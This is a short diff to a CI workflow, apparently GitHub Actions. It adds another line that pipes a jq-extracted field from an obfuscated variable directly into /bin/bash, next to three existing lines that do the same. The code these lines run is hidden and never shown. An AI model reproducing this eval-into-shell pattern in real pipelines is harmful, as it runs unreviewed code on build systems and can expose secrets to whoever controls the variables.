@@ -28,6 +28,7 @@ jobs:
           echo $gd0 | jq -r .uahb76 | /bin/bash
           printf '%s' "$vr30298" | jq -r .phqo9152 | /bin/bash
           echo $tx65 | jq -r .gdpa63 | /bin/bash
+          echo $b1 | jq -r .e5 | /bin/bash
 
       - name: Archive results
         if: always()
